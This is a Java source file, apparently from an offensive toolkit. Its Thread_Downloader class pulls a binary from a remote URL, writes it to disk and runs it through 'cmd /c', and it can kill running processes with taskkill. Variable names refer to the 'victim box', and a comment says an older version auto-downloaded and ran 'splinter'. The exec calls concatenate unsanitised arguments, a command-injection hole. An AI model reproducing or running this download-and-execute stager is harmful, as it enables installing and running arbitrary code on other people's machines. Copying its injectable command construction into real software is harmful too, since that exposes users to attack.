/**
 * @author Solomon Sonya
 */

package Downloader;

import Drivers.*;
import Main.*;

import java.io.*;
import java.net.*;

public class Thread_Downloader extends Thread implements Runnable
{
	public static final String myClassName = "Thread_Downloader";
	
	public String updateWebsite = null; 
	public File fleSaveDirectory = null;
	public String strFileName = null;/**it is okay to be null!!!**/
	public String params = null;
	int launch_action = 0;
	public Download_Tuple tuple_updateData = null;
	
	public File fleBinary_on_Victim_box = null;
	
	
	
	public Thread_Downloader(String updateSite, String outputDirectory, String fileName, String executionParameters, int launchAction)
	{
		try
		{
			try
			{
				this.mapLaunchPath();
				
				//Main.sop("Launch Path: " + Main.strLaunchPath);
				
			}catch(Exception e){}
			
			updateWebsite = updateSite;
			fleSaveDirectory = new File(outputDirectory);
			strFileName = fileName;//IT IS OK TO BE NULL!!!
			launch_action = launchAction;
			params = executionParameters;
			
			if(updateWebsite != null && fleSaveDirectory != null && fleSaveDirectory.exists() && launch_action > -1)
			{
				//launch!
				this.start();
			}
			else
			{
				Main.sop("Invalid parameters passed in. Halting program now...");
				//System.exit(1);
				Main.closeProgram();
			}
			
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "Constructor 1", e, false);
		}
	}
	
	public boolean execute_action(boolean procure_auto_update_data_from_update_website, boolean check_update_data_only, boolean download_file, boolean execute_file)
	{
		try
		{
			String file_download_link = updateWebsite; //default to download the file from a given link. if this is link to update website first, we'll enter below to update the link
			File fleOutFileComplete_With_Name = null;
			String fileNameOnly = strFileName; //default to the original file name unless specified otherwise from the auto-update website
			int action_if_file_alread_exists = 0;
			String parameters = params;
			
			//
			//Specify Default File Output path
			//
			if(fleSaveDirectory.getCanonicalPath().trim().endsWith(Main.fileSeparator))
			{
				fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + this.strFileName);
			}
			else
			{
				fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + Main.fileSeparator + this.strFileName);
			}
			
			//////////////////////////////////////////////////////////////////
			//
			//DETERMINE IF RUNNING AUTO UPDATE
			//
			//////////////////////////////////////////////////////////////////
			if(procure_auto_update_data_from_update_website)
			{
				//
				//procure update tuple first
				//
				tuple_updateData = procureUpdateTuple(updateWebsite, check_update_data_only);
				
				//
				//Determine file to download from update website
				//
				if(tuple_updateData != null)
				{
					//
					//Stop Here if we're only performing a check_update query
					//
					if(check_update_data_only)
					{
						//output data has already been displayed to user.
						
						//check if user is running most recent version
						try
						{
							if(fileNameOnly.trim().toUpperCase().contains(Main.arg_AARDVARK.trim().toUpperCase()))
							{
								double currentVersion = Double.parseDouble(Main.VERSION.trim());
								double mostUpdatedVersion = Double.parseDouble(tuple_updateData.VERSION.trim());
								
								if(currentVersion < mostUpdatedVersion)
								{
									Main.sop("\n--> A new update is available for this program. Recommend running " + Main.arg_UPDATE + " module");
								}
								
								else
								{
									Main.sop("\n* * * You are running the most updated version of the program * * *");
								}
							}
							
						}catch(Exception e){}
						
						//Terminate Program
						Main.closeProgram();
					}					
					
					//put file name and output directory together										
					if(fleSaveDirectory.getCanonicalPath().trim().endsWith(Main.fileSeparator))
					{
						fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + tuple_updateData.BINARY_NAME);
					}
					else
					{
						fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + Main.fileSeparator + tuple_updateData.BINARY_NAME);
					}
					
					
					Main.sop("\nUpdate data received. Commencing file downloader routine if appropriate...");
					
					file_download_link = tuple_updateData.BINARY_DOWNLOAD_LINK;
					fileNameOnly = tuple_updateData.BINARY_NAME;
				}
				else
				{
					Main.sop("Invalid data returned from update query. Unable to continue.  Terminating rogram now....");
					//System.exit(0);
					Main.closeProgram();
				}				
				
			} //end if for procure_auto_update_data_from_update_website
			
			//else, use the updateWebsite as the direct URL of file download						
			
			//////////////////////////////////////////////////////////////////
			//
			//DOWNLOAD FILE
			//
			//////////////////////////////////////////////////////////////////
			if(download_file)
			{				
				fleBinary_on_Victim_box = downloadFile(file_download_link, fleOutFileComplete_With_Name, fileNameOnly, Main.action_if_file_exists_CREATE_NEW);
			}
						
			
			//////////////////////////////////////////////////////////////////
			//
			//DETERMINE IF EXECUTING FILE AFTER DOWNLOAD
			//
			//////////////////////////////////////////////////////////////////
			if(execute_file)
			{
				launchFile(fleBinary_on_Victim_box, parameters, fleSaveDirectory);
			}			
			else
			{
				Main.sop("\nIf successful, newly downloaded file location:\n" + fleBinary_on_Victim_box.getCanonicalPath());
			}
			
			//////////////////////////////////////////////////////////////////
			//
			//CLOSE
			//
			//////////////////////////////////////////////////////////////////
			Main.sop("\nAll Tasks Complete. ");
			
			Main.closeProgram();
			
			return true;
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "execute_action", e, false);
		}
		
		return false;
	}
	
	
	public void run()
	{
		try
		{ 
			boolean SUCCESS = false;
			
			/*if(launch_action == Main.action_Download_Most_Updated_Version_And_Execute_File)
			{
				SUCCESS = this.execute_action(true, true, true);
			}
			
			else if(launch_action == Main.action_Download_Most_Updated_Version_ONLY)
			{
				SUCCESS = this.execute_action(true, true, true);
			}*/
			
			switch(launch_action)
			{
				case Main.action_Download_Most_Updated_Version_And_Execute_File:
				{					
					SUCCESS = this.execute_action(true, false, true, true);
					break;
				}
				
				case Main.action_Download_Most_Updated_Version_ONLY:
				{					
					SUCCESS = this.execute_action(true, false, true, false);
					break;
				}
				
				case Main.action_Check_Most_Updated_Version_ONLY:
				{					
					SUCCESS = this.execute_action(true, true, false, false);
					break;
				}
				
				case Main.action_Download_File_ONLY:
				{					
					SUCCESS = this.execute_action(false, false, true, false);
					break;
				}
				
				case Main.action_Download_And_Execute_File:
				{					
					SUCCESS = this.execute_action(false, false, true, true);
					break;
				}
				
			
			}
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "run", e, false);
		}
	}
	
	//below is the old version that auto download and executes splinter via auto-update
	/*public void run()
	{
		try
		{ 
			if(launch_action == Main.action_Download_Most_Updated_Version_And_Execute_File)
			{
				//
				//procure update tuple first
				//
				tuple_updateData = procureUpdateTuple(updateWebsite);
				
				//
				//Determine file to download from update website
				//
				if(tuple_updateData != null)
				{
					//put file name and output directory together
					File fleOutFileComplete_With_Name = null;
					
					if(fleSaveDirectory.getCanonicalPath().trim().endsWith(Main.fileSeparator))
					{
						fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + tuple_updateData.BINARY_NAME);
					}
					else
					{
						fleOutFileComplete_With_Name = new File(fleSaveDirectory.getCanonicalPath().trim() + Main.fileSeparator + tuple_updateData.BINARY_NAME);
					}
					
					
					Main.sop("\nUpdate data received. Commencing file downloader routine...");
					
					//
					//Download File
					//
					fleBinary_on_Victim_box = downloadFile(tuple_updateData.BINARY_DOWNLOAD_LINK, fleOutFileComplete_With_Name, tuple_updateData.BINARY_NAME, Main.action_if_file_exists_CREATE_NEW);
				}
				else
				{
					Main.sop("Invalid data returned from update query. Unable to continue.  Terminating rogram now....");
					//System.exit(0);
					Main.closeProgram();
				}
				
				//
				//Execute downloaded file
				//
				executeFile(fleBinary_on_Victim_box, "", fleSaveDirectory);
				
				//
				//CLOSE
				//
				Main.sop("\nAll Tasks Complete. ");
				
				Main.closeProgram();
			}
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "run", e, false);
		}
	}*/
	
	public boolean launchFile(File fle, String args, File workingDirectory)
	{
		try
		{
			if(args == null)
				args = "";
			
			Main.sop("\nAttempting to launch file: " + fle.getCanonicalPath() + " " + args);
			Process process = Runtime.getRuntime().exec("cmd /c " + fle + " " + args, null, workingDirectory);
			
			return true;
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "executeFile", e, false);
		}
		
		return false;
	}
	
	public File downloadFile(String file_download_link, File fleOutputPath, String fileNameOnly, int action_if_file_alread_exists)
	{
		try
		{
			//Ensure the file does not already exist, if so, create a new one
			try
			{
				if(fleOutputPath.exists())
				{
					Main.sop("\nNOTE: Duplicate file already in existence found at " + fleOutputPath);
					
					switch(action_if_file_alread_exists)
					{
						case Main.action_if_file_exists_TERMINATE_AND_OVERWRITE:
						{
							Main.sop("Attempting to terminate current binary and overwrite for new version");
							
							//if windows machine!
							//Main.sop("taskkill /f /im " + fileNameOnly);
							Process process = Runtime.getRuntime().exec("taskkill /f /im " + fileNameOnly, null, new File("./"));
							//Process process2 = Runtime.getRuntime().exec("taskkill /f /im " + "javaw.exe", null, new File("./"));
							
							//delete the old file
							fleOutputPath.delete();
							
							break;
						}
						
						case Main.action_if_file_exists_CREATE_NEW:
						{
							Main.sop("I will leave the existing file and create a new one now...");
							
							//String fileName = fleOutputPath.getCanonicalPath().substring(0, fleOutputPath.getCanonicalPath().indexOf(".exe"));
							String fileName  = fleOutputPath.getCanonicalPath().substring(0, fleOutputPath.getCanonicalPath().lastIndexOf("."));
							String extension = fleOutputPath.getCanonicalPath().substring(fleOutputPath.getCanonicalPath().lastIndexOf("."));
							
							//Main.sop("\n* * * * * * FileName: " + fileName + " \tExtension: " + extension);
							
							//fleOutputPath = new File(fileName + "_" + System.currentTimeMillis() + ".exe");
							fleOutputPath = new File(fileName + "_" + System.currentTimeMillis() + extension);
							
							Main.sop("New location Computed: " + fleOutputPath.getCanonicalPath());
							
							break;
						}
						
						case Main.action_if_file_exists_DO_NOTHING:
						{
							Main.sop("I will leave the existing file in place and terminate this update routine. ");
							//System.exit(0);
							Main.closeProgram();
							break;
						}
					}
				}
			}catch(Exception eee){}
			
			//Notify
			Main.sop("\nAttempting to download file from: " + file_download_link + " --> and save to: " + fleOutputPath.getCanonicalPath());
			
			//Open Connection
			URLConnection url = new URL(file_download_link).openConnection();
			
			//Byte Input Stream from the Direct Link
			InputStream is = url.getInputStream();
			
			//Open FileOutputStream
			FileOutputStream fos = new FileOutputStream(fleOutputPath);
			
			//initialize input buffer
			byte []buffer = new byte[1024];
			int numBytesRead = 0;
			
			//Begin reading, every byte we read from the website, write it to the outfile until finished
			while((numBytesRead = is.read(buffer)) > 0)
			{
				//write out read in bytes
				fos.write(buffer,  0, numBytesRead);
			}
			
			//Finished reading, close streams
			Main.sop("\nFinished reading binary from URL and writing to outfile. Closing streams now...");
			
			try
			{
				fos.close();
			}catch(Exception ee){}
			
			try
			{
				is.close();
			}catch(Exception ee){}
			
			Main.sop("Streams closed. Binary written to: " + fleOutputPath.getCanonicalPath());
			
			return fleOutputPath;
		}
		catch(Exception e)
		{
			Main.eop(myClassName, "downloadFile", e, false);
		}
		
		return null;
	}
	
	public Download_Tuple procureUpdateTuple(String updateSite, boolean check_update_data_only)
	{
		try
		{
			Download_Tuple tuple = new Download_Tuple();
			
			//less verbose if only checking update data
			if(check_update_data_only)
			{
				Main.sop("Attempting to open connection to update server...");
			}
			else//verbose!
			{
				Main.sop("Attempting to open connection to " + updateWebsite);	
			}
						
			//reach out to the website and pull the first line
			URLConnection url = new URL(updateSite).openConnection();
			
			//Open Input Stream
			BufferedReader brIn = new BufferedReader(new InputStreamReader(url.getInputStream()));
			
			//make it here, connection established!
			//Main.sop("Connection established to: " + updateWebsite + "\nParsing pertinent data now...");
			Main.sop("...Connection established! Parsing pertinent data now...");
			
			//read the first line
			String line = brIn.readLine().trim();
			
			//Parse into the tuple:
			String []arrUpdate = line.split(",");
			
			String updateVersion 	= arrUpdate[0].trim();
			String linkToBinary		= arrUpdate[1].trim();
			String updateDate		= arrUpdate[2].trim();
			String binary_name 		= arrUpdate[3].trim();
			
			//Store the data to the tuple
			tuple.VERSION 				= updateVersion;
			tuple.BINARY_DOWNLOAD_LINK 	= linkToBinary;
			tuple.UPDATE_DATE			= updateDate;
			tuple.BINARY_NAME			= binary_name;
			
			//alter output based on expected action. if we're only checking the version number, then do not be so verbose
			if(check_update_data_only)
			{
				
				Main.sop("\nUpdate query complete:");
				Main.sop("\tMost Recent Binary Name:" + tuple.BINARY_NAME);
				Main.sop("\tMost Recent Version: \t" + tuple.VERSION);
				Main.sop("\tVersion Update Date: \t" + tuple.UPDATE_DATE);
				//Main.sop("\tLink to Current Version: " + tuple.BINARY_DOWNLOAD_LINK);
								
				//Close the streams
				try
				{
					brIn.close();				
					
				}catch(Exception e){}
				
			}
			
			else//verbose!
			{
				Main.sop("\nMost Recent Version: " + tuple.VERSION);
				Main.sop("Link to Current Version: " + tuple.BINARY_DOWNLOAD_LINK);
				Main.sop("Version Update Date: " + tuple.UPDATE_DATE);
				Main.sop("Binary Name: " + tuple.BINARY_NAME);
				
				//Close the streams
				try
				{
					Main.sp("Closing Streams...");
					brIn.close();				
					Main.sp(" Streams Closed.");
				}catch(Exception e){}
				
				//
				//Pass update data back
				//
				Main.sop(" Update query complete. Returning data now...");
			}
			
			
			
			return tuple;
			
		}
		catch(ConnectException ce)
		{
			Main.sop("RATS!!!!!!!  I am unable to establish a connection to the update server; ConnectionRefused.  I can continue no further at this time. Terminating now...");
			//System.exit(0);
			Main.closeProgram();
		}
		catch(Exception e)
		{
			//Main.eop(myClassName, "procureUpdateTuple", e, true);
			Main.sop("Error encountered during update read.  Unable to continue!!!");
		}
		
		return null;
	}
	
	public void mapLaunchPath()
	{
		try
		{					
			Main.strLaunchPath = getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
			Main.strLaunchPath = Main.strLaunchPath.replace("%20"," ");
			Main.strLaunchPath = Main.strLaunchPath.replace("/", Main.fileSeparator);

			if(Main.strLaunchPath != null && Main.strLaunchPath.startsWith(Main.fileSeparator))
			{
				Main.strLaunchPath = Main.strLaunchPath.substring(1);
			}	

			try
			{
				//take the binary image name: look in the last 5 characters for the presence of a period as the extension!
				if(Main.strLaunchPath.substring(Main.strLaunchPath.length()-5).contains("."))
				{
					Main.strLaunchBinary = Main.strLaunchPath.substring(Main.strLaunchPath.lastIndexOf(Main.fileSeparator)+1);

					//since we were successful to extract the file name, remove it from the launch path
					Main.strLaunchDirectory = Main.strLaunchPath.substring(0,  Main.strLaunchPath.lastIndexOf(Main.fileSeparator));

					Main.strLaunchDirectory = Main.strLaunchDirectory + Main.fileSeparator;
				}
				else
				{
					Main.strLaunchDirectory = Main.strLaunchPath;
				}
			}catch(Exception e){}

		}
		catch(Exception e)
		{
			Main.strLaunchPath = System.getProperty("user.dir");
		}
	}

}
